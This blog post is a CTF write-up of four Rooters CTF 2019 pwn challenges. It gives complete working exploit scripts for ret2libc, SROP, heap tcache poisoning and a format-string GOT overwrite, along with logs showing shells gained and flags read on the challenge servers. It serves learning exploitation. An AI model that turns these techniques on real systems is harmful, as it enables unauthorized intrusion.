---
layout: post
title:  "Rooters CTF: Pwn Challenges"
date:   2019-10-12 14:30:00 +0800
categories: pwn
tags: Rooters-CTF
---

I played this CTF with the team `warlock_rootx`. The pwn challenges were pretty good, I solved all of them except for one.

#### Challenges

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#baby-pwn" id="markdown-toc-h1-header">baby pwn</a>
    </li>
    <li><a href="#secure-rop" id="markdown-toc-h1-header">Secure ROP</a>
    </li>
    <li><a href="#user-administration" id="markdown-toc-h1-header">USER ADMINISTRATION</a>
    </li>
		<li><a href="#xsh" id="markdown-toc-h1-header">xsh</a>
    </li>
  </ul>
</div>

# baby pwn

### **Challenge**

* **Category:** pwn
* **Points:** 254
* **Solves:** 75

>Mommy what is stack overflow?
>
>nc 35.188.73.186 1111
>
>Author: codacker


### **Solution**

Glibc version is 2.27 which was found out by using the leak + niklasb's libc database.

This was a very simple ret2libc exploit with ASLR enabled. I won't go into too much detail as there are already tons of writeups and tutorials on how to do a ret2libc attack. You may refer to my comments below for some explanation.
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6') # libc-2.27 from Ubuntu Bionic
#p = process('./vuln')
p = remote('35.188.73.186', 1111)

# Receive the initial text
p.recv()

# Important addresses
puts = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401223 # pop rdi; ret
ret = 0x40101a # ret
main = elf.symbols['main']

# For an explanation of the need for the ret gadget, please check the
# ROPEmporium Beginner's Guide under Common Pitfalls
#------------------------------------------------------
payload = 'A'*264 # Overflow to return address
payload += p64(ret) # This is needed here because of libc-2.27
payload += p64(pop_rdi) # Pop puts_got into rdi
payload += p64(puts_got)
payload += p64(puts) # Call puts(puts_got)
payload += p64(main) # Jump back to main

p.sendline(payload)

p.recvuntil('\n')

# Get puts libc leak and calculate important offsets
p.recvline()
leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

# Redo the exploit but call system('/bin/sh')
p.recv()
payload = 'A'*264
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/ctf/pwn-and-re-challenges/rooters-2019/baby_pwn/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.188.73.186 on port 1111: Done
[*] Leak: 0x7f94461419c0
[*] Libc base: 0x7f94460c1000
[*] system: 0x7f9446110440
[*] /bin/sh: 0x7f9446274e9a
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /home/*/flag.txt
rooters{L0l_W3lc0m3_70_7h3_0f_Pwn1ng}ctf
$
```

# Secure ROP

### **Challenge**

* **Category:** pwn
* **Points:** 462
* **Solves:** 32

>Secure ROP anyone?
>
>nc 146.148.108.204 4444
>
>Author: codacker

### **Solution**

Just a simple SROP (SigReturn Oriented Programming) challenge. I did two `rt_sigreturn` syscalls to solve it.

1. The first one moved the `rsp` and `rbp` into the bss segment to emulate a "stack" there. I then made a `read` syscall to read the string '/bin/sh\x00' plus some addresses to jump to after the `read`. Since the stack is being emulated in the bss segment, any `ret` instruction will just check the value at `rsp` to find where to jump to. I use this to jump to a `pop rax; syscall` after the `read` syscall.

2. In the second `rt_sigreturn` syscall, I just do an `execve` syscall with the now existing '/bin/sh\x00' string in memory.

You may need to run the exploit remotely a couple of times. Doesn't seem to be completely reliable due to network lag? It works perfectly locally.
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

def start():
    if not args.REMOTE:
        return process('./vuln')
    else:
        return remote('146.148.108.204', 4444)

p = start()
if args.GDB:
    gdb.attach(p)

p.recv()

# Important addresses
pop_rax = 0x401032 # pop rax; syscall
syscall = 0x401033 # syscall; leave; ret
rw = 0x402040 # read-write section

payload = 'A'*136 # overflow to return address
payload += p64(pop_rax) # pop rax; syscall
payload += p64(0xf) # make syscall number 15 for rt_sigreturn

# Sigreturn frame
frame = SigreturnFrame()
frame.rax = 0 # Read syscall
frame.rsp = rw+8 # move the stack pointer to the bss segment
frame.rbp = rw+0x60 # Move the base pointerr to the bss segment
frame.rdi = 0 # Read from stdin
frame.rsi = rw # Read into the read-write section
frame.rdx = 0x400 # Read 0x400 bytes
frame.rip = syscall # jumps to the syscall; leave; ret gadget after syscall

payload += str(frame)

p.sendline(payload)

# Sleep to let the payload send (needed for remote)
sleep(1)

# Now we start our new payload in the bss segment
# ------------------------------------
payload = '/bin/sh\x00' # Input /bin/sh\x00 to use later
payload += 'A'*96 # Overwrite until return address in our "emulated" stack
payload += p64(pop_rax) # Jump to pop rax; syscall
payload += p64(0xf) # Make syscall number 15 for rt_sigreturn

# Call execve now
frame = SigreturnFrame()
frame.rax = 59 # execve
frame.rdi = rw # addr of /bin/sh\x00
frame.rsi = 0 # needs to be null
frame.rdx = 0 # needs to be null
frame.rip = syscall # Jump to syscall;

payload += str(frame)

p.sendline(payload)

p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/secure_rop$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/rooters-2019/secure_rop/vuln'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 146.148.108.204 on port 4444: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /home/*/flag.txt
rooters{i_l0v3_5r0p}ctf
$
```

# USER ADMINISTRATION

### **Challenge**

* **Category:** pwn
* **Points:** 493
* **Solves:** 15

>We created a super secure user administration system can you guys help us find the unknown vulnerability.
>
>nc 34.69.116.108 3333
>
>Author: codacker

### **Solution**

Glibc version for this challenge is libc 2.27.

To be honest, I don't really know how I came up with the solution for this challenge. I trial and errored my way to getting the leak. After that, it was very easy.

The program has all security mitigations enabled except Full RELRO:
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/user_admin$ checksec vuln
[*] '/ctf/pwn-and-re-challenges/rooters-2019/user_admin/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

It lets you create a user where you type in the user's name and age. This user is malloc'd and a pointer to the user is stored in a global variable.

It lets you edit the user's name and age.

It lets you delete the user, which simply frees the user but doesn't NULL out the global variable, thus UAF.

It lets you send a message to an admin, which will again just allocate a new message on the heap.

All allocations are pretty much done with `strdup`, except when creating a user.

I found out that by doing the following, we can get a leak of `_IO_str_jumps_`:
```python
# Initial user
create('A'*8, 15)

# Double free
free()
free()

# Change LSB of fd to 0x80
edit('\x80', 15)

create('A', 15)
message('A'*0x30)

leak = u64(p.recvuntil('Saving').split('\n')[2][-6:].ljust(8, '\x00'))
libc.address = leak - 0x3e82a0
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
```

After that it was just a tcache poisoning attack to get a chunk on `__free_hook` and overwrite it with `system`. Then, calling free on a chunk that has its first 8 bytes set to '/bin/sh\x00' gives a shell.

Again there really isn't much to explain regarding the leak. I just viewed the heap a couple times, did some trial and error with creating messages and messing around with the LSB of the fd pointer after the double free, and for some reason the last `message('A'*0x30)` puts a libc address into the heap. No idea why, but I'll take what I can get.

Exploit doesn't seem to be completely reliable remotely, but works perfectly fine locally. Might have to run it a couple times to get it to work remotely.
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

def create(username, age):
    p.sendlineafter(': ', '0')
    p.sendlineafter(': ', str(age))
    p.sendafter(': ', username)

def edit(username, age):
    p.sendlineafter(': ', '1')
    p.sendlineafter(': ', str(age))
    p.sendafter(': ', username)

def free():
    p.sendlineafter(': ', '2')

def message(msg):
    p.sendlineafter(': ', '3')
    p.sendafter(': ', msg)

def start():
    if not args.REMOTE:
        return process('./vuln')
    else:
        return remote('34.69.116.108', 3333)

context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
    debug([])

# Initial user
create('A'*8, 15)

# Double free
free()
free()

# Change LSB of fd to 0x80
edit('\x80', 15)

create('A', 15)
message('A'*0x30)

leak = u64(p.recvuntil('Saving').split('\n')[2][-6:].ljust(8, '\x00'))
libc.address = leak - 0x3e82a0
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

# Tcache poisoning attack
free()
free()

edit(p64(free_hook), 15)
message('/bin/sh\x00')
message(p64(system))
free()

p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/user_admin$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/rooters-2019/user_admin/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/pwn-and-re-challenges/rooters-2019/user_admin/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 34.69.116.108 on port 3333: Done
[*] Leak: 0x7f2f8592d2a0
[*] Libc base: 0x7f2f85545000
[*] system: 0x7f2f85594440
[*] __free_hook: 0x7f2f859328e8
[*] Switching to interactive mode

Message recieved:
@DY\x85/\x7f

Saving it for admin to see!

### USER ADMINISTRATION ###

0) Create user
1) Edit user name
2) Delete user
3) Send admin a message
4) exit
Enter your choice: $ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /home/*/flag.txt
rooters{1_d0n7_f33l_g00d_mR_Pwn34}ctf
$  
```

# xsh

This challenge originally had Full RELRO set. I was almost finished solving it but then the author re-released the challenge with Partial RELRO, which made it much easier to solve.

### **Challenge**

* **Category:** pwn
* **Points:** 464
* **Solves:** 31

>xsh is an sh-compatible command language interpreter that executes commands read from the standard input or from a file. xsh also incorporates useful features from the Korn and C shells (ksh and csh).
>
>nc 35.192.206.226 5555

### **Solution**

The binary had all mitigations except Full RELRO:
```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/xsh$ checksec ./xsh
[*] '/ctf/pwn-and-re-challenges/rooters-2019/xsh/xsh'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The xsh shell only provided an `ls` command, an `echo` command, and a `zooo` command. The `zooo` command was a troll, it just printed out a poem. The `ls` command just did a normal `ls -la`. The `echo` command had a format string vulnerability.

After the first four bytes of our command is compared to 'echo', if its true, then the following code takes place:
```c
mov     eax, [ebp+cmd]
add     eax, 5
sub     esp, 0Ch
push    eax             ; format
call    _printf
add     esp, 10h
jmp     loc_1357
```

Easy format string vulnerability.

I found out that we can leak the PIE base by doing the following:
```python
# Get base address of binary
leak = execute('echo 0x%3$x')[:10]
elf.address = int(leak, 16) - 0x1249
strncmp_got = elf.got['strncmp']
system = elf.plt['system']

log.info('PIE base: ' + hex(elf.address))
log.info('strncmp_got: ' + hex(strncmp_got))
log.info('system: ' + hex(system))
```

Then I chose to use the format string vulnerability to write the address of `system` into `strncmp`'s GOT address. This way, whenever we type a command, when `strncmp(cmd, ...)` gets called, it will actually call `system(cmd)`.

You might have to run the exploit a couple times remotely to get it to work. It works 100% locally.
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./xsh')
libc = ELF('./libc.so.6')

def start():
    if not args.REMOTE:
        return process('./xsh')
        libc = ELF('./libc.so.6')
    else:
        return remote('35.192.206.226', 5555)
        libc = ELF('./libc-remote.so.6')

def execute(cmd):
    p.recv()
    p.sendline(cmd)
    return p.recvuntil('$')

context.terminal = ['tmux', 'new-window']
p = start()
if args.GDB:
    gdb.attach(p)

# Get base address of binary
leak = execute('echo 0x%3$x')[:10]
elf.address = int(leak, 16) - 0x1249
strncmp_got = elf.got['strncmp']
system = elf.plt['system']

log.info('PIE base: ' + hex(elf.address))
log.info('strncmp_got: ' + hex(strncmp_got))
log.info('system: ' + hex(system))

# Prepare to write system to strncmp_got
# Calculate each half of the address
# This is to prevent the exploit from taking way too long to write a huge address
first = int('0x' + hex(system)[-4:], 16)
second = int(hex(system)[:6], 16)

# Do the format string overwrite
payload = 'echo' + p32(strncmp_got) + p32(strncmp_got+2)
payload += '%{}c%24$n%{}c%25$n'.format(first-4-3, second-first)
execute(payload)

# Execute /bin/sh for shell
p.recv()
p.sendline('/bin/sh')

# When strncmp('/bin/sh') gets called, it will call system('/bin/sh')
p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/rooters-2019/xsh$ ./exploit.py REMOTE
[*] '/ctf/pwn-and-re-challenges/rooters-2019/xsh/xsh'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/pwn-and-re-challenges/rooters-2019/xsh/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.192.206.226 on port 5555: Done
[*] PIE base: 0x565a4000
[*] strncmp_got: 0x565a8038
[*] system: 0x565a5090
[*] Switching to interactive mode
$ ls
flag.txt
vuln
$ cat flag.txt
rooters{ep1c_xsh_esc4p3}ctf
$
```
